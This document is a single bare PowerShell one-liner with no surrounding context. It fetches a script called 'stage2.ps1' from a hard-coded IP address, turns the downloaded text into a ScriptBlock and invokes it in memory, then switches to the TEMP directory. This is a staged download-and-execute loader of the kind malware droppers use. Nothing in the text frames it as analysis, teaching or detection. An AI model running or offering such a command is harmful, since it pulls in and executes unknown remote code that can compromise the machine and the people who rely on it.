
$ScriptText = (iwr "http://198.51.100.222/stage2.ps1" -UseBasicParsing).Content; [ScriptBlock]::Create($ScriptText).Invoke(); Set-Location -Path $env:TEMP
